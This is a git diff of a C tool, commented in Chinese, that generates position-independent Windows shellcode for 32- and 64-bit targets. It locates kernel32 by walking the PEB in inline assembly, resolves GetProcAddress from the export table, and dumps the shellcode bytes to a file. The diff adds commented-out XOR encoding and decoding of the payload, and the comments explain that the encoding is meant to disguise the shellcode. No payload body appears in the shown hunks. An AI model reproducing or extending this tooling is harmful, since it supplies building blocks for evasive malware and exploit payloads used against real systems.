@@ -1,5 +1,6 @@
 // 32位与64位 通用的 windows she11code 生成工具。 语法依 at&t 语法，
 // tcc 与 gcc 均能编译并且成功执行，值得注意的是，tcc 与 gcc 编译函数的方式稍微有点不太一样。所以下面有部分使用了宏定义处理
+// 为了更强的兼容性，这里将不使用 naked 的函数处理方式，防止部分 gcc 无法编译通过的情况。
 // 编写 she11code 的代码需要注意的是
 // 1) 不能直接使用函数获取函数的地址，需要通过一定的汇编获取 Kernel32 的地址
 // 2) 后续找到 GetProcAddress LoadLibraryA 这两个函数的地址后续基本就需要这两个函数进行处理必要函数的获取
@@ -18,6 +19,8 @@ void ShellcodeStart();
 void ShellcodeEntry();
 void ShellcodeEnd();
 void CreateShellcode();
+char* ShellcodeEncode(int size);
+void ShellcodeDecode();
 
 // create shellcode bin.
 // int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) {
@@ -42,24 +45,53 @@ void CreateShellcode(){
         printf("%s error:%d\n", "create sh.bin fail.", GetLastError());
         return;
     }
+
+    // 想实现自动 shellcode 加解密的功能，不过目前在编译 32位的 shellcode 程序会有异常。
+    // 另外这种实现方式可以处理预加密，但是解密的头最好还是不要在这里就直接以函数方式实现。
+    // 对于 shellcode 来说，需要更加精致的实现手段。
+    // WriteFile(hBin, ShellcodeDecode, ShellcodeStart - ShellcodeDecode, &dwWrite, NULL);
+    // printf("ShellcodeSize:  %16d\n", dwWrite);
+    // char* newShellcode = ShellcodeEncode(ShellcodeEnd - ShellcodeStart);
+    // WriteFile(hBin, newShellcode, ShellcodeEnd - ShellcodeStart, &dwWrite, NULL);
+    // printf("ShellcodeSize:  %16d\n", dwWrite);
+    
     dwSize = ShellcodeEnd - ShellcodeStart;
     WriteFile(hBin, ShellcodeStart, dwSize, &dwWrite, NULL);
     printf("ShellcodeSize:  %16d\n", dwWrite);
 }
 
 
-
-
-
-
-
+// 64位编译，64位系统测试下，这里是可以成功跑通，而32位则不行，暂时未知。
+// 加密可以实现，但是解密却只能在 64 位上复现有点奇怪。
+// char* ShellcodeEncode(int size){
+    // char* temp = (char *)malloc(size* sizeof(char));
+    // int i = 0;
+    // for(;i < size; i++){
+        // temp[i] = ((char*)ShellcodeStart)[i] ^ 233;
+    // }
+    // return temp;
+// }
+// void ShellcodeDecode(){
+    // DWORD dwSize = ShellcodeEnd - ShellcodeStart;
+    // int i = 0;
+    // for(;i < dwSize; i++){
+        // ((char*)ShellcodeStart)[i] ^= 233;
+    // }
+    // ShellcodeStart(); // TINYC use this
+// }
 // shellcode
-__declspec(naked) void ShellcodeStart(){
-	#ifdef __MINGW32__
-	asm("jmp ShellcodeEntry");
-	#else
-	ShellcodeEntry(); // TINYC use this
-	#endif
+void ShellcodeStart(){
+    #ifdef __MINGW32__
+        #ifdef _WIN64
+        asm("pop %rbp"); 
+        asm("jmp ShellcodeEntry");
+        #else
+        asm("pop %ebp"); 
+        asm("jmp _ShellcodeEntry"); // old style. fuck!
+        #endif
+    #else
+    ShellcodeEntry(); // TINYC use this
+    #endif
 }
 // init function struct.
 typedef FARPROC (WINAPI* FN_GetProcAddress)(
@@ -118,28 +150,30 @@ void ShellcodeEntry(){
 }
 // get kernel32 and get GetProcAddress.
 #ifdef _WIN64
-__declspec(naked) HMODULE getKernel32(){
+HMODULE getKernel32(){
     asm("mov %gs:(0x60), %rax");
     asm("mov 0x18(%rax), %rax");
     asm("mov 0x20(%rax), %rax");
     asm("mov (%rax), %rax");
     asm("mov (%rax), %rax");
     asm("mov 0x20(%rax), %rax");
-	#ifdef __MINGW32__
-	asm("ret"); // TINYC dnot need this
-	#endif
+    #ifdef __MINGW32__
+    asm("pop %rbp"); // sometime you cannot use naked func, this is for more compatibility.
+    asm("ret"); // TINYC dnot need this
+    #endif
 }
 #else
-__declspec(naked) HMODULE getKernel32(){
+HMODULE getKernel32(){
     asm("mov %fs:(0x30), %eax");
     asm("mov 0x0c(%eax), %eax");
     asm("mov 0x14(%eax), %eax");
     asm("mov (%eax), %eax");
     asm("mov (%eax), %eax");
     asm("mov 0x10(%eax), %eax");
-	#ifdef __MINGW32__
-	asm("ret"); // TINYC dnot need this
-	#endif
+    #ifdef __MINGW32__
+    asm("pop %ebp"); // sometime you cannot complier naked func, this is for more compatibility.
+    asm("ret"); // TINYC dnot need this
+    #endif
 }
 #endif
 FARPROC getProcAddress(HMODULE hModuleBase){
@@ -151,7 +185,8 @@ FARPROC getProcAddress(HMODULE hModuleBase){
     LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
     LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
     FARPROC GetProcAddressAPI;
-    for (UINT i = 0; i < pExportDir->NumberOfNames; i++){
+    UINT i = 0;
+    for (; i < pExportDir->NumberOfNames; i++){
         LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
         if (    pFuncName[0] == 'G' &&
                 pFuncName[1] == 'e' &&
